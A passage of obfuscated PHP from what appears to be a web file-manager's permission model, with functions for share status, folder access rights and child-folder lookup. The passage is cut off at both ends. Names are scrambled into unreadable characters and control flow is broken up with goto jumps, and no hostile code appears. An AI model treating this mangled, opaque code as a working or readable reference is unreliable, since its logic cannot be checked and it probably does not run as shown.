$BŞ‹óâ™óö = Input::get($E¦³›·Š²[459], $E¦³›·Š²[7], $E¦³›·Š²[1883], array($E¦³›·Š²[1807], $E¦³›·Š²[453])); goto EŞ´£¾åÃÌ; c‚¬¬ÌÙ‹: $E¦³›·Š² =& $_SERVER[œÕÊİğö]; $F¦ ğ¹©–– = array(); if ($f†ñ·ƒ¼²[$E¦³›·Š²[751]]) { $f·»Ï÷Ó‰† = $f†ñ·ƒ¼²[$E¦³›·Š²[499]] ? $f†ñ·ƒ¼²[$E¦³›·Š²[499]] : strtotime(date($E¦³›·Š²[1881])); $F¦ ğ¹©––[$E¦³›·Š²[204]] = array($E¦³›·Š²[341], array($f†ñ·ƒ¼²[$E¦³›·Š²[751]], $f·»Ï÷Ó‰†)); } goto FºëÔå‡¥Ù; EŞ´£¾åÃÌ: $b÷×¾‡¥­¦ = array($E¦³›·Š²[451] => $E¦³›·Š²[452], $E¦³›·Š²[453] => $E¦³›·Š²[454]); $BÊˆóáÑ¨ = $E¦³›·Š²[1887] . $b÷×¾‡¥­¦[$BŞ‹óâ™óö]; $E»í‘ÆöéÕ = Model($E¦³›·Š²[1879])->where($F¦ ğ¹©––)->order($BÊˆóáÑ¨)->selectPage(20); goto B²Ò´òÕ‰; B÷‡Åî›Š: $this->_listDataApply($E»í‘ÆöéÕ[$E¦³›·Š²[377]]); return $E»í‘ÆöéÕ; goto a˜´º½Ø‘¼; a˜´º½Ø‘¼: } public function reportStatus($dêõÏó¾‹‰) { goto BçŞÓĞß‘º; D–ùÄÁÓº: if (!$c½äºêáë) { return !1; } $fõ›Êè˜¨‹ = array($CÅ±Ë°Æ°[740] => $dêõÏó¾‹‰[$CÅ±Ë°Æ°[740]]); if ($dêõÏó¾‹‰[$CÅ±Ë°Æ°[740]] == $CÅ±Ë°Æ°[1884] && $c½äºêáë[$CÅ±Ë°Æ°[740]] == $CÅ±Ë°Æ°[1884]) { $fõ›Êè˜¨‹[$CÅ±Ë°Æ°[740]] = 0; } goto dÑŒ’·ÌÒ; dÑŒ’·ÌÒ: $D‚„í¾¦¯ö = Model($CÅ±Ë°Æ°[1879])->where($eà¦¨„äí³)->save($fõ›Êè˜¨‹); if ($dêõÏó¾‹‰[$CÅ±Ë°Æ°[740]] == $CÅ±Ë°Æ°[438]) { if ($c½äºêáë[$CÅ±Ë°Æ°[470]] != $CÅ±Ë°Æ°[201] && $this->shareFileMeta($c½äºêáë[$CÅ±Ë°Æ°[470]])) { $this->shareFileMeta($c½äºêáë[$CÅ±Ë°Æ°[470]], 0); } $this->remove($c½äºêáë[$CÅ±Ë°Æ°[491]]); return !0; } if ($D‚„í¾¦¯ö && $dêõÏó¾‹‰[$CÅ±Ë°Æ°[740]] == $CÅ±Ë°Æ°[1884]) { $cÒÓææ™–‹ = $fõ›Êè˜¨‹[$CÅ±Ë°Æ°[740]] == $CÅ±Ë°Æ°[1884] ? 1 : 0; $this->shareFileMeta($c½äºêáë[$CÅ±Ë°Æ°[470]], $cÒÓææ™–‹); $this->removeByFile($c½äºêáë[$CÅ±Ë°Æ°[470]]); } goto dÛöõê®† ; BçŞÓĞß‘º: $CÅ±Ë°Æ° =& $_SERVER[œÕÊİğö]; $eà¦¨„äí³ = array($CÅ±Ë°Æ°[404] => $dêõÏó¾‹‰[$CÅ±Ë°Æ°[404]]); $c½äºêáë = Model($CÅ±Ë°Æ°[1879])->where($eà¦¨„äí³)->field($CÅ±Ë°Æ°[1888])->find(); goto D–ùÄÁÓº; dÛöõê®† : return $D‚„í¾¦¯ö; goto A§õ÷ˆÌ‡‹; A§õ÷ˆÌ‡‹: } private function removeByFile($e½±ÏĞÌè) { goto BÖÆ„´’‘¢; dè…¡Ô«Ô: $FŒœ’ÇîÅ = array_to_keyvalue($CŒõËëÛ†, $e‰‚ƒ‰Ø¿ê[43], $e‰‚ƒ‰Ø¿ê[491]); $this->remove($FŒœ’ÇîÅ); goto aéÀÎˆÓÃã; d¾½Œ¾Õ‡œ: $F‡ãÈ¦ğ² = array($e‰‚ƒ‰Ø¿ê[406] => array($e‰‚ƒ‰Ø¿ê[7], $f¯†§­á‘Á), $e‰‚ƒ‰Ø¿ê[496] => 1); $CŒõËëÛ† = $this->where($F‡ãÈ¦ğ²)->field($e‰‚ƒ‰Ø¿ê[491])->select(); if (empty($CŒõËëÛ†)) { return; } goto dè…¡Ô«Ô; BÖÆ„´’‘¢: $e‰‚ƒ‰Ø¿ê =& $_SERVER[œÕÊİğö]; $CŒõËëÛ† = Model($e‰‚ƒ‰Ø¿ê[822])->where(array($e‰‚ƒ‰Ø¿ê[470] => $e½±ÏĞÌè))->field($e‰‚ƒ‰Ø¿ê[406])->select(); $f¯†§­á‘Á = array_to_keyvalue($CŒõËëÛ†, $e‰‚ƒ‰Ø¿ê[43], $e‰‚ƒ‰Ø¿ê[406]); goto d¾½Œ¾Õ‡œ; aéÀÎˆÓÃã: } private function shareFileMeta($eô†£×­… , $d¢Ş ¥ó¹¶ = null) { $dƒ†¢ºÁ’ë =& $_SERVER[œÕÊİğö]; $f¥³ŠØÓÖ = array($dƒ†¢ºÁ’ë[470] => $eô†£×­… , $dƒ†¢ºÁ’ë[103] => $dƒ†¢ºÁ’ë[1889]); if (is_null($d¢Ş ¥ó¹¶)) { return Model($dƒ†¢ºÁ’ë[1890])->where($f¥³ŠØÓÖ)->find(); } $f¥³ŠØÓÖ[$dƒ†¢ºÁ’ë[382]] = $d¢Ş ¥ó¹¶; Model($dƒ†¢ºÁ’ë[1890])->add($f¥³ŠØÓÖ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\x75\162\143\x65\x5f\141\x75\164\150"; public function getAuth($aÃ± ¨’ò¸) { goto F¨´­ÒÆî; E”êšÛ«•ø: $bßš¢ŞŒŠ = array(); $f«Ù·Ø¢İî = 2 << 25; foreach ($bã‚âÇ»¨š as $CĞì‡•±Ç) { goto AÔ®ØÜÛ‘ë; AÔ®ØÜÛ‘ë: $fÜ–ÖêíÃì = Model($Eƒ«ÕÉ…‰Œ[510])->listData($CĞì‡•±Ç[$Eƒ«ÕÉ…‰Œ[1820]]); if (!$fÜ–ÖêíÃì) { continue; } $f·ƒ‰ÆÓ¯ù[] = $CĞì‡•±Ç; goto DÂŠÎ¢¦Å÷; d‘¯´ğÀ¦õ: if ($CĞì‡•±Ç[$Eƒ«ÕÉ…‰Œ[415]] == SourceModel::TYPE_USER && $CĞì‡•±Ç[$Eƒ«ÕÉ…‰Œ[507]] == $Eƒ«ÕÉ…‰Œ[201]) { $EîçÖ£šÏ = 0; } $bßš¢ŞŒŠ[] = $fÜ–ÖêíÃì[$Eƒ«ÕÉ…‰Œ[417]] + $EîçÖ£šÏ; goto bÆä­÷¸ä¥; DÂŠÎ¢¦Å÷: $EîçÖ£šÏ = 0; if ($CĞì‡•±Ç[$Eƒ«ÕÉ…‰Œ[415]] == SourceModel::TYPE_GROUP) { $EîçÖ£šÏ = $f«Ù·Ø¢İî * 2; } if ($CĞì‡•±Ç[$Eƒ«ÕÉ…‰Œ[415]] == SourceModel::TYPE_USER) { $EîçÖ£šÏ = $f«Ù·Ø¢İî; } goto d‘¯´ğÀ¦õ; bÆä­÷¸ä¥: } goto d­¾íÀÀ; F¨´­ÒÆî: $Eƒ«ÕÉ…‰Œ =& $_SERVER[œÕÊİğö]; $bã‚âÇ»¨š = $this->sourceAuthSelect($aÃ± ¨’ò¸); $f·ƒ‰ÆÓ¯ù = array(); goto E”êšÛ«•ø; d­¾íÀÀ: array_multisort($bßš¢ŞŒŠ, SORT_DESC, $f·ƒ‰ÆÓ¯ù); return $f·ƒ‰ÆÓ¯ù; goto E¬–ÜŸå×Í; E¬–ÜŸå×Í: } public function sourceAuthSelect($AèéÂ±îŒ) { goto dîÄ”Ó¡šß; f‰ï§³Æ™È: if ($bÊêÂ‰†µ‹) { return $AêØ¡…–¹Â; } return $b¡Şã Æ±; goto F§ø¦À“ƒÛ; e–ÄŒ¶•´: if (count($aøò–—ÓÙÃ) == count($AèéÂ±îŒ)) { return $bÊêÂ‰†µ‹ ? $aøò–—ÓÙÃ[$AèéÂ±îŒ[0]] : $aøò–—ÓÙÃ; } $dùå§¯Ìİ° = $C”™·ßºŸº[1891]; $A½¥‰¡ï„ = array($C”™·ßºŸº[406] => array($C”™·ßºŸº[7], $AèéÂ±îŒ)); goto eî‘ß…Ö‘¾; dîÄ”Ó¡šß: $C”™·ßºŸº =& $_SERVER[œÕÊİğö]; static $bÖá™ò¾ƒ¹ = array(); $bÊêÂ‰†µ‹ = is_array($AèéÂ±îŒ) ? !1 : !0; goto D›­¯çÖ; eî‘ß…Ö‘¾: $AêØ¡…–¹Â = $this->field($dùå§¯Ìİ°)->order($C”™·ßºŸº[404])->where($A½¥‰¡ï„)->select(); $b¡Şã Æ± = array_to_keyvalue_group($AêØ¡…–¹Â, $C”™·ßºŸº[406]); foreach ($AèéÂ±îŒ as $c«œİ­Á‚’) { $bÖá™ò¾ƒ¹[$c«œİ­Á‚’] = $b¡Şã Æ±[$c«œİ­Á‚’] ? $b¡Şã Æ±[$c«œİ­Á‚’] : array(); } goto f‰ï§³Æ™È; D›­¯çÖ: if ($bÊêÂ‰†µ‹) { $AèéÂ±îŒ = array($AèéÂ±îŒ); } $aøò–—ÓÙÃ = array(); foreach ($AèéÂ±îŒ as $c«œİ­Á‚’) { if (isset($bÖá™ò¾ƒ¹[$c«œİ­Á‚’])) { $aøò–—ÓÙÃ[$c«œİ­Á‚’] = $bÖá™ò¾ƒ¹[$c«œİ­Á‚’]; } } goto e–ÄŒ¶•´; F§ø¦À“ƒÛ: } public function setAuth($A†„¼Ù¸¶, $BÏ¸é´¿Ë) { goto B¶‰É‰ï¬; B¶‰É‰ï¬: $d”Š®³ª—ï =& $_SERVER[œÕÊİğö]; $CÓ•À÷ˆ’± = Model($d”Š®³ª—ï[1228])->sourceInfo($A†„¼Ù¸¶); if (!$CÓ•À÷ˆ’±) { return !1; } goto DßÜ­ß›Ìó; DßÜ­ß›Ìó: if ($CÓ•À÷ˆ’±[$d”Š®³ª—ï[415]] != SourceModel::TYPE_GROUP) { return !1; } $CÌ‡–»Õ¦Í = 1; $CÛÄ­ô‰© = $CÓ•À÷ˆ’±[$d”Š®³ª—ï[507]]; goto C¡šª—…ŸÊ; FÌ°…°öÅ: foreach ($BÏ¸é´¿Ë as $f…Ó‹®‰öÇ) { if (!in_array($f…Ó‹®‰öÇ[$d”Š®³ª—ï[415]], $e”ÍŸ·ï¤½)) { show_json(LNG($d”Š®³ª—ï[1892]), !1); } if ($CÛÄ­ô‰© != $CÌ‡–»Õ¦Í) { if ($f…Ó‹®‰öÇ[$d”Š®³ª—ï[415]] == SourceModel::TYPE_GROUP) { } if ($f…Ó‹®‰öÇ[$d”Š®³ª—ï[507]] != 0 && !in_array($f…Ó‹®‰öÇ[$d”Š®³ª—ï[507]], $cŠ¥¯“æì¨)) { } } if ($f…Ó‹®‰öÇ[$d”Š®³ª—ï[507]] == 0) { $f…Ó‹®‰öÇ[$d”Š®³ª—ï[415]] = SourceModel::TYPE_USER; } $f¡ƒÏĞÉöé[] = array($d”Š®³ª—ï[406] => $A†„¼Ù¸¶, $d”Š®³ª—ï[415] => intval($f…Ó‹®‰öÇ[$d”Š®³ª—ï[415]]), $d”Š®³ª—ï[507] => intval($f…Ó‹®‰öÇ[$d”Š®³ª—ï[507]]), $d”Š®³ª—ï[1820] => intval($f…Ó‹®‰öÇ[$d”Š®³ª—ï[1820]]) ? intval($f…Ó‹®‰öÇ[$d”Š®³ª—ï[1820]]) : 0, $d”Š®³ª—ï[1874] => intval($f…Ó‹®‰öÇ[$d”Š®³ª—ï[1874]]) ? intval($f…Ó‹®‰öÇ[$d”Š®³ª—ï[1874]]) : -1); } $this->where(array($d”Š®³ª—ï[421] => $A†„¼Ù¸¶))->delete(); $this->addAll($f¡ƒÏĞÉöé); goto D”Ôáá¿óˆ; C¡šª—…ŸÊ: if ($CÛÄ­ô‰© != $CÌ‡–»Õ¦Í) { $bÇˆ¥ÛêÔ = array($d”Š®³ª—ï[1720] => $CÛÄ­ô‰©); $cŠ¥¯“æì¨ = Model($d”Š®³ª—ï[1806])->field($d”Š®³ª—ï[1551])->where($bÇˆ¥ÛêÔ)->select(); $cŠ¥¯“æì¨ = array_to_keyvalue($cŠ¥¯“æì¨, $d”Š®³ª—ï[43], $d”Š®³ª—ï[1551]); } $e”ÍŸ·ï¤½ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $f¡ƒÏĞÉöé = array(); goto FÌ°…°öÅ; D”Ôáá¿óˆ: return !0; goto D‚§ÁŠ­÷; D‚§ÁŠ­÷: } public function authClear($bäÛ¹ã) { $DÖ†Ø›Å¦â =& $_SERVER[œÕÊİğö]; $d•íÎéÚøÌ = Model($DÖ†Ø›Å¦â[1228])->sourceInfo($bäÛ¹ã); $déç§¥’‰ = array($bäÛ¹ã); if ($d•íÎéÚøÌ[$DÖ†Ø›Å¦â[414]] == $DÖ†Ø›Å¦â[97]) { $d‚š©±Ù…‚ = array($DÖ†Ø›Å¦â[587] => array($DÖ†Ø›Å¦â[547], $d•íÎéÚøÌ[$DÖ†Ø›Å¦â[524]] . $bäÛ¹ã . $DÖ†Ø›Å¦â[548])); $déç§¥’‰ = Model($DÖ†Ø›Å¦â[1228])->field($DÖ†Ø›Å¦â[421])->where($d‚š©±Ù…‚)->getField($DÖ†Ø›Å¦â[406], !0); $déç§¥’‰[] = $bäÛ¹ã; } $this->where(array($DÖ†Ø›Å¦â[421] => array($DÖ†Ø›Å¦â[422], $déç§¥’‰)))->delete(); return !0; } public function getAllChildren($d×§Äç‰È) { goto D¾«Æ¡ìİ; cçÛÜÎùƒÖ: if ($bÈ ¤‹°¦‹[$D¿÷æ™¡”»[501]] == $D¿÷æ™¡”»[201] && $bÈ ¤‹°¦‹[$D¿÷æ™¡”»[507]] != $C¼¡Î²ÂîØ) { $BŠÀ”Ÿªì§ = $this->groupChidldAllRootSource($bÈ ¤‹°¦‹[$D¿÷æ™¡”»[507]]); } $cŸñ›—–‘ = $this->field($D¿÷æ™¡”»[406])->group($D¿÷æ™¡”»[406])->select(); $cŸñ›—–‘ = array_to_keyvalue($cŸñ›—–‘, $D¿÷æ™¡”»[43], $D¿÷æ™¡”»[406]); goto aÉóˆù³¾®; c˜™Û¤ïå²: if ($bÈ ¤‹°¦‹[$D¿÷æ™¡”»[415]] != SourceModel::TYPE_GROUP) { return array(); } $C¼¡Î²ÂîØ = 1; $BŠÀ”Ÿªì§ = array($d×§Äç‰È); goto cçÛÜÎùƒÖ; fá¢£„Ä: return $this->sourceListAuth($d­ÍÜ”é×÷); goto eŞó¢Ê‘ó; CÁ¬™÷¬Ğ¥: $dƒÔ„ÈÏ± = Model($D¿÷æ™¡”»[822])->field($Cîôß°½Î¢)->where($F±œÉêÚèó)->select(); $d­ÍÜ”é×÷ = array($d×§Äç‰È); foreach ($dƒÔ„ÈÏ± as $BÉ”šøÀëê) { foreach ($BŠÀ”Ÿªì§ as $Aæ¢‘¥²Ì) { $AÙÑœ˜Áœ = $D¿÷æ™¡”»[57] . $Aæ¢‘¥²Ì . $D¿÷æ™¡”»[57]; $aÌ–ø‡Ì‘é = $BÉ”šøÀëê[$D¿÷æ™¡”»[524]] . $BÉ”šøÀëê[$D¿÷æ™¡”»[406]] . $D¿÷æ™¡”»[57]; if (strstr($aÌ–ø‡Ì‘é, $AÙÑœ˜Áœ)) { $d­ÍÜ”é×÷[] = $BÉ”šøÀëê[$D¿÷æ™¡”»[406]]; break; } } } goto fá¢£„Ä; aÉóˆù³¾®: if (!$cŸñ›—–‘) { return array(); } $Cîôß°½Î¢ = $D¿÷æ™¡”»[1893]; $F±œÉêÚèó = array($D¿÷æ™¡”»[406] => array($D¿÷æ™¡”»[7], $cŸñ›—–‘), $D¿÷æ™¡”»[434] => $D¿÷æ™¡”»[201]); goto CÁ¬™÷¬Ğ¥; D¾«Æ¡ìİ: $D¿÷æ™¡”» =& $_SERVER[œÕÊİğö]; $bÈ ¤‹°¦‹ = Model($D¿÷æ™¡”»[1228])->sourceInfo($d×§Äç‰È); if ($bÈ ¤‹°¦‹[$D¿÷æ™¡”»[414]] != $D¿÷æ™¡”»[97]) { return $this->sourceListAuth(array($d×§Äç‰È)); } goto c˜™Û¤ïå²; eŞó¢Ê‘ó: } private function sourceListAuth($b°„óàä°ö) { goto Eí´Ú ‚ä´; bÌÄ°ğ·‡ª: array_multisort($A…„×™İ‚„, SORT_ASC, $C“İ¾æ†×–); return $C“İ¾æ†×–; goto C¸¶Í¥ê½; d¶†Éğ¦„Æ: $C“İ¾æ†×– = array(); $A…„×™İ‚„ = array(); foreach ($BŸÉÖ—Ô– as $FÜ½¬ƒ¾Ê) { goto f§´·ÈãˆÆ; f§´·ÈãˆÆ: unset($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[457]]); unset($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[455]]); unset($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[417]]); goto BËãˆ£™‘°; D’å‚Ïƒ×ƒ: $DÂá¢ÎÁ­ = count(explode($E¸ÔŞõÛ½[8], trim($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[522]], $E¸ÔŞõÛ½[8]))); $A…„×™İ‚„[] = $DÂá¢ÎÁ­ + ($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[39]] == $E¸ÔŞõÛ½[87] ? 0 : 1000); goto eäÑì®Ì•; E…ÂÏò½î•: $FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[1894]] = $this->authTargetInfo($d™°ºâ°‹); $FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[522]] = rtrim($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[528]], $E¸ÔŞõÛ½[8]) . $E¸ÔŞõÛ½[8] . ltrim($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[522]], $E¸ÔŞõÛ½[8]); $C“İ¾æ†×–[] = $FÜ½¬ƒ¾Ê; goto D’å‚Ïƒ×ƒ; BËãˆ£™‘°: unset($FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[95]]); $d™°ºâ°‹ = $dÃİÏâ®ÖŸ[$FÜ½¬ƒ¾Ê[$E¸ÔŞõÛ½[406]]]; if (!$d™°ºâ°‹) { continue; } goto E…ÂÏò½î•; eäÑì®Ì•: } goto bÌÄ°ğ·‡ª; Eí´Ú ‚ä´: $E¸ÔŞõÛ½ =& $_SERVER[œÕÊİğö]; $BŸÉÖ—Ô– = Model($E¸ÔŞõÛ½[1228])->sourceListInfo($b°„óàä°ö, !0); $dÃİÏâ®ÖŸ = $this->sourceAuthSelect($b°„óàä°ö); goto d¶†Éğ¦„Æ; C¸¶Í¥ê½: } private function groupChidldAllRootSource($D¾Øã­ßùÉ) { $C¬–õŠ—‹ô =& $_SERVER[œÕÊİğö]; $A÷„¦æòé = Model($C¬–õŠ—‹ô[1895])->groupChildrenAll($D¾Øã­ßùÉ); $FóŠ›©ƒº = array($C¬–õŠ—‹ô[501] => 0, $C¬–õŠ—‹ô[507] => array($C¬–õŠ—‹ô[7], $A÷„¦æòé), $C¬–õŠ—‹ô[415] => SourceModel::TYPE_GROUP); $b‡óÑÌÌ£ê = Model($C¬–õŠ—‹ô[822])->field($C¬–õŠ—‹ô[406])->where($FóŠ›©ƒº)->select(); $b‡óÑÌÌ£ê = array_to_keyvalue($b‡óÑÌÌ£ê, $C¬–õŠ—‹ô[43], $C¬–õŠ—‹ô[406]); return $b‡óÑÌÌ£ê; } private function authTargetInfo($E´Öõää¶ë) { goto E®»ÄËğâ„; bÇ¸Ñ¶Ñ: $aù¥÷¿¸“œ = 2 << 25; foreach ($E´Öõää¶ë as $c‡®ÍËÌ¹) { goto CØéøôÃ„¾; CØéøôÃ„¾: $DÄƒ¢î„—· = Model($fªÉˆª“ùè[510])->listData($c‡®ÍËÌ¹[$fªÉˆª“ùè[1820]]); if (!$DÄƒ¢î„—·) { continue; } if ($c‡®ÍËÌ¹[$fªÉˆª“ùè[415]] == SourceModel::TYPE_USER) { $fô‚‚ º¿¨ = Model($fªÉˆª“ùè[516])->getInfoSimpleOuter($c‡®ÍËÌ¹[$fªÉˆª“ùè[507]]); if ($fô‚‚ º¿¨[$fªÉˆª“ùè[1551]] == $fªÉˆª“ùè[1107]) { continue; } if ($fô‚‚ º¿¨[$fªÉˆª“ùè[1551]] == $fªÉˆª“ùè[201]) { $fô‚‚ º¿¨[$fªÉˆª“ùè[38]] = LNG($fªÉˆª“ùè[1896]); } } else { $fô‚‚ º¿¨ = Model($fªÉˆª“ùè[525])->getInfoSimple($c‡®ÍËÌ¹[$fªÉˆª“ùè[507]]); } goto AÜë…Àˆ÷·; f±‡ó¯ÇË’: $d«·ºøš£¤ = 0; if ($c‡®ÍËÌ¹[$fªÉˆª“ùè[415]] == SourceModel::TYPE_GROUP) { $d«·ºøš£¤ = $aù¥÷¿¸“œ * 2; } if ($c‡®ÍËÌ¹[$fªÉˆª“ùè[415]] == SourceModel::TYPE_USER) { $d«·ºøš£¤ = $aù¥÷¿¸“œ; } goto bİÌÄÊ¨; AÜë…Àˆ÷·: if (!$fô‚‚ º¿¨) { continue; } $fô‚‚ º¿¨[$fªÉˆª“ùè[469]] = $DÄƒ¢î„—·; $bÅï…³òó[] = $fô‚‚ º¿¨; goto f±‡ó¯ÇË’; bİÌÄÊ¨: if ($c‡®ÍËÌ¹[$fªÉˆª“ùè[415]] == SourceModel::TYPE_USER && $c‡®ÍËÌ¹[$fªÉˆª“ùè[507]] == $fªÉˆª“ùè[201]) { $d«·ºøš£¤ = 0; } $E–¼‚Ú¡§[] = $DÄƒ¢î„—·[$fªÉˆª“ùè[417]] + $d«·ºøš£¤; goto eéÄÛ´ö; eéÄÛ´ö: } array_multisort($E–¼‚Ú¡§, SORT_DESC, $bÅï…³òó); goto CÂÓä‡‹ö–; CÂÓä‡‹ö–: return $bÅï…³òó; goto E¸Ó¯¶‹ªØ; E®»ÄËğâ„: $fªÉˆª“ùè =& $_SERVER[œÕÊİğö]; $bÅï…³òó = array(); $E–¼‚Ú¡§ = array(); goto bÇ¸Ñ¶Ñ; E¸Ó¯¶‹ªØ: } public function getAllChildrenByUser($dš©îØë§İ, $aÙ‡×Æèò×) { goto FË•ªî£«ó; EÛ³ß‘–¿¯: $bƒíš²‹è§ = Model($d¢­¹ÑÊÕš[1228])->sourceInfo($dš©îØë§İ); $DŞæ„…¸ß’ = array(); $fñÜóÈÜ£ = 1; goto Fõ«¹Ï¢—Ç; FË•ªî£«ó: $d¢­¹ÑÊÕš =& $_SERVER[œÕÊİğö]; $e²Ö«„  = Model($d¢­¹ÑÊÕš[541])->getInfo($aÙ‡×Æèò×); if (!$aÙ‡×Æèò× || !$dš©îØë§İ || !$e²Ö«„ ) { return array(); } goto EÛ³ß‘–¿¯; Fõ«¹Ï¢—Ç: if ($bƒíš²‹è§[$d¢­¹ÑÊÕš[501]] == $d¢­¹ÑÊÕš[201] && $bƒíš²‹è§[$d¢­¹ÑÊÕš[507]] != $fñÜóÈÜ£ && $this->groupContainUser($bƒíš²‹è§[$d¢­¹ÑÊÕš[507]], $aÙ‡×Æèò×)) { foreach ($e²Ö«„ [$d¢­¹ÑÊÕš[1897]] as $fìßé¾é¤¿) { $B¢Ìâ‚÷µä = Model($d¢­¹ÑÊÕš[525])->getInfo($fìßé¾é¤¿[$d¢­¹ÑÊÕš[1720]]); $EĞ†ÁŒ½–Ÿ = Model($d¢­¹ÑÊÕš[541])->getInfoSimpleOuter($aÙ‡×Æèò×); $EĞ†ÁŒ½–Ÿ[$d¢­¹ÑÊÕš[469]] = $fìßé¾é¤¿[$d¢­¹ÑÊÕš[417]]; if (Model($d¢­¹ÑÊÕš[510])->authCheckAction($fìßé¾é¤¿[$d¢­¹ÑÊÕš[417]][$d¢­¹ÑÊÕš[417]], $d¢­¹ÑÊÕš[1740])) { continue; } $BİÂ¬ÇÑ†¦ = array($d¢­¹ÑÊÕš[38] => $d¢­¹ÑÊÕš[1503] . $B¢Ìâ‚÷µä[$d¢­¹ÑÊÕš[38]], $d¢­¹ÑÊÕš[406] => $B¢Ìâ‚÷µä[$d¢­¹ÑÊÕš[95]][$d¢­¹ÑÊÕš[406]], $d¢­¹ÑÊÕš[86] => KodIO::make($B¢Ìâ‚÷µä[$d¢­¹ÑÊÕš[95]][$d¢­¹ÑÊÕš[406]]), $d¢­¹ÑÊÕš[501] => $d¢­¹ÑÊÕš[201], $d¢­¹ÑÊÕš[415] => $d¢­¹ÑÊÕš[518], $d¢­¹ÑÊÕš[39] => $d¢­¹ÑÊÕš[551], $d¢­¹ÑÊÕš[522] => $B¢Ìâ‚÷µä[$d¢­¹ÑÊÕš[529]], $d¢­¹ÑÊÕš[1720] => $B¢Ìâ‚÷µä[$d¢­¹ÑÊÕš[1720]], $d¢­¹ÑÊÕš[526] => $B¢Ìâ‚÷µä[$d¢­¹ÑÊÕš[501]], $d¢­¹ÑÊÕš[1894] => array($EĞ†ÁŒ½–Ÿ)); $DŞæ„…¸ß’[$BİÂ¬ÇÑ†¦[$d¢­¹ÑÊÕš[406]]] = $BİÂ¬ÇÑ†¦; } } $e‘š¾—æß™ = array(); $b¼ŠŠ²Ô¬° = $this->getAllChildren($dš©îØë§İ); goto Cº¹„§Ñ; Cº¹„§Ñ: foreach ($b¼ŠŠ²Ô¬° as $C¶ˆ¾óÏ) { $eğÑ•õ„Õ = !1; foreach ($C¶ˆ¾óÏ[$d¢­¹ÑÊÕš[1894]] as $a‰…˜ÄÙì¢) { if ($a‰…˜ÄÙì¢[$d¢­¹ÑÊÕš[1551]]) { if ($a‰…˜ÄÙì¢[$d¢­¹ÑÊÕš[1551]] == $aÙ‡×Æèò×) { $eğÑ•õ„Õ = !0; break; } } if ($a‰…˜ÄÙì¢[$d¢­¹ÑÊÕš[1720]]) { if ($this->groupContainUser($a‰…˜ÄÙì¢[$d¢­¹ÑÊÕš[1720]], $aÙ‡×Æèò×)) { $eğÑ•õ„Õ = !0; break; } } } if ($eğÑ•õ„Õ) { $e‘š¾—æß™[] = $C¶ˆ¾óÏ; } $bö°šÇœß = $C¶ˆ¾óÏ[$d¢­¹ÑÊÕš[406]]; if (isset($DŞæ„…¸ß’[$bö°šÇœß])) { $C¶ˆ¾óÏ[$d¢­¹ÑÊÕš[1894]][] = $DŞæ„…¸ß’[$bö°šÇœß][0]; $DŞæ„…¸ß’[$bö°šÇœß] = !1; } } $DŞæ„…¸ß’ = array_filter(array_values($DŞæ„…¸ß’)); $e‘š¾—æß™ = array_merge($DŞæ„…¸ß’, $e‘š¾—æß™); goto Eá¦—™Œ¥¾; Eá¦—™Œ¥¾: return $e‘š¾—æß™; goto eã¬—«…†; eã¬—«…†: } public function setAllChildrenByUser($d¶á£›…ª­, $fÆ‘Ğ×ø‡, $cÔô¤ñö) { $c†³†ÎÀƒÎ =& $_SERVER[œÕÊİğö]; $b˜¡¢‚ŸÎğ = $this->getAllChildrenByUser($d¶á£›…ª­, $fÆ‘Ğ×ø‡); if (!$cÔô¤ñö || !$b˜¡¢‚ŸÎğ) { return !1; } foreach ($b˜¡¢‚ŸÎğ as $e²áÍã´±ˆ) { $AÅæí²öŞô = array(); foreach ($e²áÍã´±ˆ[$c†³†ÎÀƒÎ[1894]] as $cƒå…äâÁ–) { $a³š˜öæ = $cƒå…äâÁ–[$c†³†ÎÀƒÎ[469]]; $FÉŠåÀ¾„Ì = $cƒå…äâÁ–[$c†³†ÎÀƒÎ[1551]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Bé­Ö„ãÚ× = $cƒå…äâÁ–[$c†³†ÎÀƒÎ[1551]] ? $cƒå…äâÁ–[$c†³†ÎÀƒÎ[1551]] : $cƒå…äâÁ–[$c†³†ÎÀƒÎ[1720]]; if ($cƒå…äâÁ–[$c†³†ÎÀƒÎ[1551]] && $cƒå…äâÁ–[$c†³†ÎÀƒÎ[1551]] == $fÆ‘Ğ×ø‡) { continue; } $AÅæí²öŞô[] = array($c†³†ÎÀƒÎ[406] => $e²áÍã´±ˆ[$c†³†ÎÀƒÎ[406]], $c†³†ÎÀƒÎ[415] => $FÉŠåÀ¾„Ì, $c†³†ÎÀƒÎ[507] => intval($Bé­Ö„ãÚ×), $c†³†ÎÀƒÎ[1820] => isset($a³š˜öæ[$c†³†ÎÀƒÎ[404]]) ? intval($a³š˜öæ[$c†³†ÎÀƒÎ[404]]) : 0, $c†³†ÎÀƒÎ[1874] => isset($a³š˜öæ[$c†³†ÎÀƒÎ[1874]]) ? intval($a³š˜öæ[$c†³†ÎÀƒÎ[1874]]) : -1); } $AÅæí²öŞô[] = array($c†³†ÎÀƒÎ[406] => $e²áÍã´±ˆ[$c†³†ÎÀƒÎ[406]], $c†³†ÎÀƒÎ[415] => SourceModel::TYPE_USER, $c†³†ÎÀƒÎ[507] => intval($fÆ‘Ğ×ø‡), $c†³†ÎÀƒÎ[1820] => intval($cÔô¤ñö), $c†³†ÎÀƒÎ[1874] => -1); $this->where(array($c†³†ÎÀƒÎ[421] => $e²áÍã´±ˆ[$c†³†ÎÀƒÎ[406]]))->delete(); $this->addAll($AÅæí²öŞô); } return !0; } public function get($Eˆ¬À‰‡•ˆ) { $E»„ÅßæïÚ = $this->getSourceList(array($Eˆ¬À‰‡•ˆ), !0); return $E»„ÅßæïÚ[0]; } public function getSourceList($e¯åÎ›ƒ„ù, $b‚³‚Ô‹Œ´ = false, $F‚ğ±ğ‹™¤ = false) { goto e¾”¨¨ô´‘; aÒ†Ö…ÇÁ: $fÒâÑƒĞëÔ = 